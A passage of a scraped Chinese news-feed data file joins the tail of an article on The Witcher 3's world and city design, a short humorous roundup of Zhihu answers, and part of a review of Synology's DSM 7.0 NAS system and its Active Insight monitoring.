alt=\"\"></figure><p>在开始构思前，尊重原著是基础，根据书中每一个细节描述，来确定大世界每个区域的基调和地理位置。在电影设计中，常常需要找到故事的真实参考和依托，游戏也不例外。<strong>从北欧的风景到苏格兰的废墟，似乎每个游玩地点都能在现实中找到参照。</strong></p>\n<p>如同<strong>维斯特洛</strong>（《权力的游戏》）、<strong>海拉鲁</strong>（《塞尔达：荒野之息》）、<strong>中土</strong>（《指环王》）一样，《巫师 3：狂猎》需要将小说中史诗般壮阔的大陆带进三维的写实世界之中。这个世界既有广阔的平原也有恶臭的沼泽，甚至比开放世界游戏的先贤<strong>《上古卷轴》</strong>的范围还要大。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-8daafc2a9d5f8975dcec17752b360104_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic4.zhimg.com/v2-902dd219562e9811c7711f1cd3c03a29_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>游戏以斯拉夫、凯尔特和斯堪的纳维亚文化为基础</strong>，所以设计团队研究了那个时期和地域的众多古籍、照片、旧画等历史资料。此外，波兰的郊外保留了大量中世界的村落，这是游戏中最终呈现环境的真实细节参照来源。设计团队除了考察建筑地点外，还拍摄了大量的山脉、小河、岩层素材。</p>\n<p><strong><strong>城市及村落的建造</strong></strong></p>\n<p><strong>建造城市建筑和建造整个世界是一样的</strong>，都是一个巨大的挑战（不仅从设计的角度来看，而且从优化、游戏玩法和技术方面来看也是如此），只是城镇的规模更小而已。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-06085ca90d5b4fe2246450f5878f3cce_720w.jpg?source=8673f162\" alt=\"\"></figure><p>在城镇的内部，会首先划分出不同的阶层居住区域，这样可以宏观上估计出模型和装饰的分布情况。<strong>每个城区都有一个背景故事和不同的感觉</strong>。例如，<strong>诺维格勒</strong>（Novigrad）是一座隐藏在巨大城墙后面的巨大城市，建筑物楼层高，外缘散布着许多肮脏的小巷，市中心则逐渐变得干净清洁，街道下面还有下水道。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-95069c2d23eeb80a9da708de329a9efc_720w.jpg?source=8673f162\" alt=\"\"><figcaption>诺维格勒城鸟瞰图</figcaption></figure><p><strong>萨普科夫斯基</strong>曾在《猎魔人》小说中将诺维格勒描述为：“它是世界之都，不算旅行者的话，住着几乎三万的居民。 想象一下！砖房、鹅卵石铺成的主要街道、一个海港、商店、摊贩、四个水车、屠宰场、锯木厂、一个制作漂亮拖鞋的大工厂，以及每一个可以想象的行会和贸易...”</p>\n<p>下面是诺维格勒郊区到城镇的概念图设计，你可以从中看到变化：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-894ad97f412123672a0dd843ddf20fca_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-317c5f12279efcb14ea57229ca2a5633_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-d13ca76a5e5738d30d7a27ebe5e7f764_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-6a2a4d8d507adc1dc23e7406fddb797b_720w.jpg?source=8673f162\" alt=\"\"></figure><p>城市中的各个元素不是随意累加和摆放的，<strong>它必须符合真实的逻辑运转。</strong>比如诺维格勒周边郊区挤满了农场与工业建筑，为城市输血，甚至你能看到每个水果都是在哪种植的，所有木车都是在哪里制造的。</p>\n<p>另一个很好的例子是<strong>陶森特</strong>，其都城<strong>鲍克兰</strong>（Beauclair）根据小说描述规划了 4 个不同的阶层分布区域，按从低到高的山地进行分布。每个区域都有一个高耸的地标，并在大远景上视角上进行构图串联。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-8e9140a9237e4a8cc77cda188aca2c44_720w.jpg?source=8673f162\" alt=\"\"><figcaption>陶森特的首都鲍克兰都城</figcaption></figure><p>在主城居民区部分设置了 6 个主要出入口，根据方位划分为 4 个街区，<strong>中间根据大量的动线及玩家视角测试，规划了体验各不相同的街巷分支</strong>，连接着广场、钟楼、商社。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-84b252e560f762ac9538597a10e7b46f_720w.jpg?source=8673f162\" alt=\"\"><figcaption>陶森特的首都鲍克兰的高度分析</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-47574d64dcdf279b0dbc01ef7b5e618f_720w.jpg?source=8673f162\" alt=\"\"><figcaption>陶森特的首都鲍克兰的规划分析</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-9ca857e31350e70113ee27b781701086_720w.jpg?source=8673f162\" alt=\"\"><figcaption>陶森特的首都鲍克兰中设计的多个支路</figcaption></figure><p>猎魔人的聚集地——<strong>凯尔莫罕</strong>（Kaer Morhen）相比于小说更加杂草丛生，破败不堪，只有塌陷的脚手架将要塞连接在一起。这个要塞周边的沟壑和峡谷成为了标志性的险要环境，印证了小说中描述的“<strong>荒野</strong>”及“<strong>不可到达</strong>”。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-bfd095004ecf9b357e3632b032055155_720w.jpg?source=8673f162\" alt=\"\"><figcaption>猎魔人的训练和聚集地凯尔莫罕</figcaption></figure><p>在开发过程中，最大的挑战当属<strong>史凯利格</strong>（Skelige）地区，作为北境列国之一，由 6 个岛屿组成。<strong>设计团队参考了包括法罗群岛、中世纪冰岛和格陵兰岛，以充实该地区并创造一个与主大陆截然不同的开放世界。</strong>与小说描述的相同，玩家登上都城凯尔 - 托德( Kaer Trolde )后能鸟瞰整个 群岛。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b29b3074547adf08fe42430e16bd49c5_720w.jpg?source=8673f162\" alt=\"\"><figcaption>由六个岛屿组成的史凯利格地区</figcaption></figure><p>在设计考究方面，可以从岛上很多的细节看出来。比如史凯利格地区的墙壁是由当地的岩石而不是砖块制成的，因为粘土在这些岩石岛上是稀缺的。这里田地很少，因为<strong>斯凯利格的土壤无法支持集约化农业，但牧羊和捕鱼却丰富得多。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-6d7aa8f706f5030ae83b90611a0e7a9c_720w.jpg?source=8673f162\" alt=\"\"><figcaption>从都城凯尔 - 托德眺望的美景</figcaption></figure><p>游戏种虚拟建筑的规划和环境设计与真实的城市规划一样，需要考虑体验和视觉层面上的诸多问题，还需要关卡设计师、人物设计师和编剧的密切配合，从而<strong>找到最佳的关卡构图，确保环境对叙事的推动。</strong>有时环境艺术家会创造一个很酷的地点，并激发任务设计师的新支线任务，而作家会围绕它继续创作一个新的故事。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-04d482dcad4402d1071dd72894b1c56c_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>动态世界设计团队</strong>（Living World Design）会主要考虑环境如何变得活跃，包括商人和旅馆的数量，摊位数量等等。此外，每个村庄还需要考虑居住的人数及玩家可进入的房间数量。体验是至关重要的，你会在同一个城镇中迷路，遇见君子或人渣，或撞见领主或乞丐。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-f343ca3289142b4e57847ba284c7fcdd_720w.jpg?source=8673f162\" alt=\"\"></figure><p>CD Projekt Red 的首席编剧还研究了孤立社会的文化模式，比如他们如何对外部影响做出反应，他们对新来者的态度如何？<strong>这样能够确保所有的定居点和村庄都是合理存在的。</strong></p>\n<p><strong><strong>郊野与过渡地带</strong></strong></p>\n<p>除了这些著名的游戏地标城镇、村落外，大片的野外地区（比饱受战乱和饥饿瘟疫的无人之地威伦）基本被各种各样的植被所覆盖，它们构成了景观，也是史诗感画面构图的烘托基石。CD PROJEKT RED<strong>请来了植被专家，专门为游戏中各个海拔、区域、地质的植被进行研究归类</strong>，研究什么样的树叶生长在什么地方，并将其划分到特定地区的资产库和地图集。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-f75d85ecfcd716090790330ada16e24a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>环境艺术家根据研究成果及收集来的形状和轮廓参考，按照<strong>大树 - 小树 - 蕨类植物 - 小草</strong>的顺序开始地编的工作。</p>\n<p>城镇与主要区域之间充满了非常多未知的区域，这也是沙盒游戏的魅力。从一个地方接到任务后，前往另一个城市的途中可能会遇到偶然的风景、危险的野怪、求助的村民。<strong>对于这些过渡地带的打磨，是《巫师》系列被人津津乐道的优点。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-fc57e639179cd0d9bfbe10c95c4a73e3_720w.jpg?source=8673f162\" alt=\"\"></figure><p>从一个遥远的地方旅行到另一个地方会让做任务的玩家感觉到史诗感。</p>\n<p>当然，如果一个玩家在树林中旅行了很长一段时间，<strong>需要确保用一些空地、地形高度或水来“松弛”森林风景。</strong>在细节层面，可以尝试不用的颜色、氛围和植被来创造变化，例如添加雾气或让树木看起来又老又干。</p>\n<p>好的场景设计一定离不开背后的技术支持，最后给大家普及下背后使用的工具和优化过程</p>\n<p>对于庞大的环境设计与制作流程，工具的效率至关重要，而优化更是需要集中力度克服的问题。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d2b8de0a7af9fdbb656cdd63def7cae6_720w.jpg?source=8673f162\" alt=\"\"><figcaption>都城鲍克兰的资源消耗分布</figcaption></figure><p>在开始着手搭建前，艺术部门会绘制大量的<strong>概念艺术</strong>，帮助环境艺术家将它们带入游戏中。之后，环境艺术家还要根据地图兴趣点先用灰色 box 摆放出城市、村庄、洞穴，并在之后替换成更精细化的模型、纹理、植被。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-55a0dc231320f64317523e9a17ffd924_720w.jpg?source=8673f162\" alt=\"\"><figcaption>都城鲍克兰的快速搭建 Layout</figcaption></figure><p>Layout 出来之后，概念艺术家会<strong>在 Layout 截图上面继续绘制细节</strong>，指导后面装饰、贴画、水坑、铺装的添加。随着游戏剧情策划对故事改编创作的深入，世界的创建也不断经历着改变。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-79344d6011178ea5ae224b8750c8762d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>▲ 建筑立面游戏原画参考</figcaption></figure><p><strong>刻意让一些模型和网格呈现不完美的状态是十分必要的</strong>，这能大大增强写实感，看起来是真实的人类建造的，而不是重复的机器。</p>\n<p>树木植被主要使用<strong>SpeedTree</strong>进行创建，并用<strong>REDengine 3</strong>游戏引擎的植被笔刷工具进行放置。每种地形类型都有单独的画笔，比如<strong>田野、草地、沼泽</strong>和<strong>森林</strong>，环境艺术家可以在其中定义很多东西，包括树木之间的距离和比例等等。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-83945523196f45c85606fd682b121b9d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>还有一些区域必须手动制作，比如为了在开放空间中混合植被，比如平原和森林过渡地带。当然，<strong>植被的摆放会影响打斗和其他玩法</strong>，这会经历非常多的调整和迭代。</p>\n<p>有时候，一座山阻碍了重要任务地点的可见度情况，所以团队在后面不得不移除这座山，并以一个湖泊和岸边小村庄代替。<strong>随着主要区域的完工，团队会把精力放在了那些“美丽的角落”</strong>，比如街道、墙壁或下水道的局部区域，让玩家所到之处都充满真实气息。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-f9f88d60e34d1cb0f5da4ed8183f1e0c_720w.jpg?source=8673f162\" alt=\"\"><figcaption>游戏编辑器中的道具库与道具摆放</figcaption></figure><p>优质的画面与宏大的世界必然需要解决棘手的优化问题。《巫师 3：狂猎》的世界必须在 PC、Xbox One 和 PlayStation 4 平台上同时运转良好。实现这一目标需要大量<strong>技术美术</strong>人员的帮助，以创建准确的技术预算。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-28cb955785ddcd74b6d7585c93dbc540_720w.jpg?source=8673f162\" alt=\"\"><figcaption>不同 LOD 下的模型优化数据</figcaption></figure><p><strong>优化方式主要考虑对网格的模块化重复利用，还包括代理网格、细节级别的平衡</strong>，有时候可能只需要让部分街道变得弯曲，便能大大减少固定点可见模型的渲染量。为了节省纹理资源的数量，每个区域可能会利用一套不同的纹理数组。</p>\n<p>玩过游戏的玩家经常会在不经意的路上看到一棵被怪物战斗留下划痕的老树，一个荒无人烟的废墟，它们仿佛对于任务来说没有任何帮助，但<strong>这每一点每一滴的细节增加了整个世界的深度，扩展了整个故事的内容。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-916b2abc2f42084de3b89c9675726e34_720w.jpg?source=8673f162\" alt=\"\"></figure><p>正式这些在艺术和技术上的钻研和“波兰蠢驴”般的精神，<strong>在某个时刻，玩家忘记了游戏本身，成为了真正的“猎魔人”。</strong></p>\n<p>看到这里，希望大家可以不仅限于“好看”这个评判标准，以更整体的角度审视游戏里的设计亮点哈~</p>\n<p>完</p>\n<p>主要参考来源：</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//80.lv/articles/world-building-of-witcher-3/\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>80.lv/articles/world-bu</span><span>ilding-of-witcher-3/</span><span></span></a></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.youtube.com/watch%3Fv%3D9vEfH9SJ9mY\" target=\"_blank\" rel=\"nofollow noreferrer\">GDC：Building Beauclair in The Witcher 3: Wild Hunt</a></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/30799745\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9739003"},{"title":"瞎扯 · 如何正确地吐槽","date":"2021-08-08 23:06:20","description":"\n<div>\n<h2>东京奥运会的闭幕式有哪些亮点？你对哪一幕印象最深刻？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-709ff9b74510ee4453a6fc6d28c4a52c_l.jpg?source=8673f162\"><span>梁山好阿姨</span>\n<a href=\"https://www.zhihu.com/question/478233798/answer/2047187221\" hidden>阅读原文</a>\n</div>\n<div>\n<p>是不是因为日本的街舞大神们都在《这就是街舞 4》比赛，所以闭幕式的舞蹈表演是现在这个样子的？</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/478233798\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>你无意间做过哪些好事？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>知乎用户，</span><span>春暖花开，知乎有你，滴-</span>\n<a href=\"https://www.zhihu.com/question/291727586/answer/478553746\" hidden>阅读原文</a>\n</div>\n<div>\n我也不知道，不过我肯定做过很多我不知道的好事，我娘常常说：看你做的好事！\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/291727586\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>我们为什么爱女足?</h2>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-2cd02e51b41db6c25e7feff0efefa684_l.jpg?source=8673f162\"><span>cOMMANDO，</span><span>“都在酒里……”</span>\n<a href=\"https://www.zhihu.com/question/473176319/answer/2015311264\" hidden>阅读原文</a>\n</div>\n<div>\n<p>我觉得大家不是特别爱女足。</p>\n<p>大家只是爱赢。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/473176319\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>如果你的知乎ID是你的超能力，那你的超能力是什么？</h2>\n<div>\n<div>\n<img src=\"https://pica.zhimg.com/v2-d5e1ab7110faeac66e7be399bde432cf_l.jpg?source=8673f162\"><span>废物小点心，</span><span>郎骑竹马来，引刀成一快。</span>\n<a href=\"https://www.zhihu.com/question/403592555/answer/1321896744\" hidden>阅读原文</a>\n</div>\n<div>\n<p>呜呜呜……</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/403592555\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>被可乐杯压住的蟑螂会在想什么？</h2>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/db81ba9f0_l.jpg?source=8673f162\"><span>馍兽</span>\n<a href=\"https://www.zhihu.com/question/34574855/answer/59233435\" hidden>阅读原文</a>\n</div>\n<div>\n<p>他在想：“他 * 的，好杯壁”</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/34574855\">阅读原文<span></span></a></div>\n</div>\n","link":"https://daily.zhihu.com/story/9739025"},{"title":"群晖 DSM 7.0 正式版体验，这个新一代的 NAS 系统用起来怎么样","date":"2021-08-08 03:00:00","description":"\n<p>7 月中旬，群晖正式宣布向所有适配的 NAS 机型推送其新一代的 NAS 操作系统 DSM 7.0，至此，这个研发时间以及测试时间最久的 DSM 系统终于正式发布，而在今年年初，我也基于虚拟环境对 DSM 7.0 测试版本进行了一系列的评测（延伸阅读：<a href=\"https://sspai.com/post/64374\">新一代 NAS 操作系统：群晖 DSM 7.0 深度体验</a>），不过考虑到当时主要是在虚拟环境中体验，因此部分功能都没有介绍完全，而在正式发布之后，我们终于可以基于真机环境，对这个全新的 NAS 系统体验来一次「大补遗」。</p>\n<h2><strong>DSM 7.0 现在支持哪些设备？</strong></h2>\n<p>硬件支持上，群晖中国区的微信公众号说得比较含糊，而根据其他区的群晖官网上的信息，DSM 7.0 支持的机型最早可以追溯到 DS213J，下面这个列表则是目前可以收到 DSM 7.0 正式版更新（部分机型不支持 OTA 升级，需要手动下载安装更新）的机型：</p>\n<ul>\n<li>21 系列：RS2821RP+、RS2421RP+、RS2421+、RS1221RP+、RS1221+、DS1821+、DS1621+</li>\n<li>20 系列：RS820RP+、RS820+、DS1520+、DS920+、DS720+、DS620slim、DS420+、DS420j、DS220+、DS220j、DS120j</li>\n<li>19 系列：RS1219+、RS819、DS2419+II、DS2419+、DS1819+、DS1019+、DS419slim、DS119j</li>\n<li>18 系列：RS2818RP+、RS2418RP+、RS2418+、RS818RP+、RS818+、DS1618+、DS918+、DS718+、DS418、DS418play、DS418j、DS218+、DS218、DS218play、DS218j、DS118</li>\n<li>17 系列：RS217、DS1817+、DS1817、DS1517+、DS1517</li>\n<li>16 系列：RS2416RP+、RS2416+、RS816、DS916+、DS716+II、DS716+、DS416、DS416play、DS416slim、DS416j、DS216+II、DS216+、DS216、DS216play、DS216j、DS216se、DS116</li>\n<li>15 系列：RS815RP+、RS815+、RS815、DS2415+、DS1815+、DS1515+、DS1515、DS715、DS415+、DS415play、DS215+、DS215j、DS115、DS115j</li>\n<li>14 系列：RS2414RP+、RS2414+、RS814RP+、RS814+、RS814、RS214、DS414、DS414slim、DS414j、DS214+、DS214、DS214play、DS214se、DS114</li>\n<li>13 系列：DS2413+、DS1813+、DS1513+、DS713+、DS213j</li>\n</ul>\n<p>从上面的更新列表中其实不难看出，本次 DSM 7.0 的支持机型最早可以支持到 13 年的 J 系列机型，所以说从硬件的兼容性来看，DSM 7.0 对于老机型的支持还是比较好的。当然如果从运行 DSM 7.0 的流畅性来看，群晖给出的建议则是建议运行 DSM 7.0 的群晖的运存至少是在 1GB 以上。低于 1GB 的运存虽然可以运行，但系统运行起来就不那么流畅了。所以如果的手里的机型是 17年之前的低端机型（例如 J 系列），那么我的建议是保留在 DSM 6.X 而不选择升级，这样反而体验会更好一些（DSM 7.0 目前并不能直接降级到 DSM 6.x）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/702a34eed4d64c19ca2962f88d561a18.png\"></figure><p>另外上面列出的机型是目前可以收到 DSM 7.0 更新的机型（截止到 2021 年 7 月 30 日），对于更高阶的例如 FS、SA、XS / XS +、DVA 机型其实也是支持 DSM 7.0 的，只不过目前尚不在第一批次的更新机型范围内。根据群晖官方的说法，这些更高阶的机型将会在 2021 年的下半年直接获得 DSM 7.0.1 的更新推送，考虑到这部分更高阶的机型主要在企业生产环境中使用，自然在大版本升级上要更为谨慎一些。</p>\n<h2><strong>DSM 7.0 有哪些大变化？</strong></h2>\n<p>相比 DSM 6.X，虽然从一般功能体验上 DSM 7.0 变化并不算大（大部分的功能以及应用套件都得到了保留），但实际深入体验之后会发现 DSM 7.0 在很多方面做了「减法」，一些在之前 DSM 6.x 上的使用技巧在 DSM 7.0 上就已经完全失效了。下面我就列举一些我在使用中感受较为明显的变化。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/64f56aecd2b7403dd791387cc31526e7.png\"></figure><h3><strong>除移动存储和打印机设备不再支持其他的 USB 外设</strong></h3>\n<p>按照群晖自己的说法，由于 DSM 7.0 在底层系统架构上出现了变化，因此 DSM 7.0 上仅保留支持的 USB 外设只有移动存储（U盘、移动硬盘）以及 USB 打印机，而其他的几种其实很常用的 USB 外设都已经不再支持。例如：</p>\n<ul>\n<li>USB DAC/扬声器/声卡</li>\n<li>无线网卡/4G 网卡</li>\n<li>蓝牙适配器</li>\n<li>电视棒</li>\n</ul>\n<p>这一调整将导致 NAS 不再可以作为音乐爱好者的「数字转盘」使用，此前我介绍的将有源音箱/Sonos 通过 NAS 转换成 Airplay/DLNA 音箱的技巧也在 DSM 7.0 下完全失效，如果你和笔者一样以前是将音箱通过 USB DAC 直接连接在 NAS 上，现在可能需要单独购买的转换硬件了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/a7ccdaa0c29cc93adcecb89c8ff99b33.png\"></figure><p>这一调整使得群晖只能通过有线的方式进行连接，对于家中没有空间进行布线的朋友而言会比较不方便，所以如果考虑升级到 DSM 7.0 ，那么连接方式可以考虑通过电力猫来解决。</p>\n<p>如果此前使用群晖作为家中电器的蓝牙网关的话，那么升级到 DSM 7.0 之后将必须通过其他独立设备来实现类似的蓝牙网关功能。</p>\n<p>如果之前是通过 USB 电视棒来进行电视节目的录制，升级到 DSM 7.0 可能就需要使用其他办法了。</p>\n<h3><strong>DSM 7.0 不支持 ext3 文件系统的存储空间</strong></h3>\n<p>这一文件系统格式主要是在较老的设备上会还在使用，如果数据存储在基于 ext3 文件系统格式硬盘的话，升级到 DSM 7.0 就会出现无法识别的情况。目前官方给出的做法就是先将数据备份，然后再转移到 DSM 7.0 支持的文件系统的存储空间中。</p>\n<h3><strong>不再支持 DDSM</strong></h3>\n<p>DSM 是一种基于 Linux 上的 NAS 操作系统，本质上都可以通过虚拟化或者容器化的方式来进行部署，因此在 DSM 6.x 上群晖为了方便部署推出了 DDSM（Docker DSM），可以通过 Docker 镜像方式来部署 DDSM，但在实际使用上反而不如基于虚拟机的 VDSM，所以从 DSM 7.0 开始就取消了对 DDSM 的支持，而如果设备中已经部署了 DDSM 并处于生产环境中，群晖官方的建议是保持主机设备的系统版本还是 DSM 6.x，当然基于虚拟化技术的 VDSM 在 DSM 7.0 中则继续获得了支持。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/11ae14acfabb8297860817026d4863cf.png\"></figure><h3><strong>视频转码不再支持 转码到 FLV 格式</strong></h3>\n<p>另一个比较大的变化和视频转码功能有关，从 DSM 7.0 开始，下面列出的这些机型将不再支持将视频文件转码成 FLV 及 MPEG-4 Part 2 格式，群晖也没有说明该变化的具体原因：</p>\n<p>DS120j、DS119j、DS216se、DS215j、DS115、DS115j、RS814、RS214、DS414、DS414slim、DS414j、DS214+、DS214、DS214se、DS114、DS213j</p>\n<h3><strong>大量套件将不再获得支持</strong></h3>\n<p>升级到 DSM 7.0 之后打开「套件中心」，如果仔细观察你会发现「所有套件」中的套件数量大幅减少。而根据发行日志，群晖自己开发的套件中删除了：Cloud Station Server、Cloud Station ShareSync、Moments、Photo Station 以及 Synology File Manager，当然这里面有的是被新的套件取代，而有的则是彻底不再支持。</p>\n<p>至于第三方开发的套件，目前已经确认将在 DSM 7.0 不再支持的有：Discourse、DokuWiki、Drupal、Drupal8、DVBLink、GitLab、GLPI、Hasplm、Java7、Java8、LimeSurvey、Logitech® Media Server、LXQt、Magento、Magento2、MantisBT、Mono、Moodle、Node.js 0.10、Node.js 0.12、Node.js v4、Node.js v6、Node.js v8、Odoo 8、OpenERP 6.1、OpenERP 7.0、OrangeHRM、Orthanc、osCommerce、osTicket、PHP PEAR、phpBB、Piwik、Podcast Generator、PrestaShop、PrestaShop1.7、 PythonModule、Redmine、Ruby、Spree、SugarCRM、SVN、Tomcat6、Tomcat7、TVMosaic、Webalizer。</p>\n<p>这里一方面是本身第三方套件更新支持上存在延迟，第三方套件的开发商根本来不及完成对 DSM 7.0 的适配。而另一方面则是以上不少套件可以通过 Docker 这种更灵活的方式进行部署，所以不再支持其实对于一般用户而言也不会有太大的影响。</p>\n<h3><strong>哪些套件进行了更新升级</strong></h3>\n<p>而作为这几年群晖大力推广的私有同步云，群晖 Drive 也在 DSM 7.0 中成为最为重要的功能组件，并且从 DSM 7.0 开始彻底的取代了原先的 Cloud Station 套件组。因此在 DSM 7.0 中，原先 6.x 时代的 Cloud Station Server 以及 Cloud Station ShareSync 在 DSM 7.0 都被整合到了 Synology Drive Server 中，当然对应的还有原先 Cloud Station 的一系列的客户端产品，比如 Cloud Station Drive、Cloud Station Backup、DS cloud 等等，因此如果之前使用的是 Cloud Station，那么NAS 端升级到 DSM 7.0 后升级将会保留数据平滑升级到群晖 Drive，只不过对应的客户端也需要单独下载调整。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/d8580482c6962c5c6926b8c801f90fab.png\"></figure><p>另外原本的 DSM 6.X 中两款图片类应用——Synology Moments 以及 Photo Station ，在升级到 DSM 7.0 会自动被 Synology Photos 替代。而在此前的体验中我也提到了两者的区别以及最终整合到 Synology Photos 的效果。虽然在 NAS 端整个升级以及套件数据合并的操作并不需要太多人为干预，但在移动客户端还是需要手动单独下载 Synology Photos 客户端，原先的 DS Photo 以及 Moments 的手机端都将不可用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/2ccf9b594b263c3f32265351479ab5f3.png\"></figure><h3><strong>社区套件在 DSM 7.0 的支持情况</strong></h3>\n<p>作为最大的第三方群晖套件社区，synocommunity 比较早的开始了套件的升级操作，相比 DSM 6.x，DSM 7.0 对套件的权限获取有更高的要求，因此套件需要更新才能在 DSM 7.0 上正常安装运行，而目前一些常用的社区套件也已经完成了升级，例如笔者我此前经常会使用的 ffmpeg 以及 Jellyfin 都已经完全适配，只不过在安装过程中弹出相应的警告按钮，提醒我们套件来自社区，需要明确其存在安全风险。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/a51b48dae09df5ad693ff753106dc8ce.png\"></figure><h2><strong>那些在测试版系统中无法体验到的新功能</strong></h2>\n<h3><strong>Synology Active Insight 全天候监控服务</strong></h3>\n<p>在年初撰写 <a href=\"https://sspai.com/post/64374\">新一代 NAS 操作系统：群晖 DSM 7.0 深度体验</a> 时，当时 DSM 7.0 测试版我是通过 VDSM 的方式通过虚拟机进行体验，也因此无法体验到 7.0 上一项新的功能：Active Insight 全天候 NAS 监控服务，而在升级到 DSM 7.0 正式版后，我终于可以通过公有云来监控家中 NAS 的运行情况。</p>\n<p>Active Insight 是一项在 DSM 7.0 上线的新功能，简单来说就是将家中的群晖的相关数据以数据图表的形式呈现在公有云中，这样你即便你在外，也可以通过访问 Active Insight 的网站来查看家中群晖运行情况。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/4ab2ded382a5c368e4edc42b2b968658.png\"></figure><p>首先我们需要登录群晖，然后在「控制面板」-「Synology 账户」中勾选「启动 Active Insight」，并且在「服务状态」中，勾上「采集性能指标」，然后再点击右下角的「应用」来保存设置。这样你的群晖的运行数据就会自动上传到 Synology Active Insight 中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/f23d6d32af97d6b2eb27e32dc40f9768.png\"></figure><p>之后我们需要通过网页浏览器登录 <a href=\"https://insight.synology.com/login\">Synology Active Insight</a>，点击登录并输入你的群晖账户以及密码，稍等片刻就可以看到监控数据控制台了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/7b2ae49165c94997fb751f409f261b73.png\"></figure><p>首先看到的是你的群晖相关信息的总览，我的 Active Insight 主要呈现了「主机总数」、「过去七天发生的事件」，以及对应的主机的性能指标，这里包括当前的CPU 平均负载、网络的发送/接受数据量、内存的利用率、存储空间利用率、硬盘利用率以及磁盘的温度。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/7dc0ad8d596b1b84a57905bc10aba468.png\"></figure><p>进入到「主机」选项卡，你会看到当前账户下对应群晖主机的数据仪表盘，如存储空间使用情况、内存和 CPU 使用情况、磁盘性能等。点击仪表盘就可以看到更为详细的数据图表。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/5bcd56c2c5d380a5baebb5e7e7efbde2.png\"></figure><p>在这个更为详细的数据图表中，首先看到的是性能方面的一天数据，当然也可以通过右侧的时间选择器来对监控数据的时间区间进行调整，默认的是系统数据，其实就是 CPU 利用率以及负载，内存和交换空间利用率、网络发送接收的数据等等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/9d0aadc696a00d495b9869a9e3b0f863.png\"></figure><p>而作为网络存储设备中最为重要的硬盘信息则放在了第二个选项卡中单独呈现，你可以看到的包括总的存储空间的利用率、读取IOPS、写入 IOPS、读取以及写入延迟、读取写入的通量等等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/0bf6fbcfa5f4209ab7634b38b8f10cb1.png\"></figure><p>除了总的存储空间数据之外，Active Insight 还针对不同的设备类型细致的呈现了不同存储介质的相关性能信息，如果是支持 SSD 缓存的机型，则还可以看到 SSD 缓存的利用率、读取/写入 IOPS、读取/写入延迟、读取/写入通量以及缓存的命中率。</p>\n<figure class=\"image ss-img-wrapper\"><img 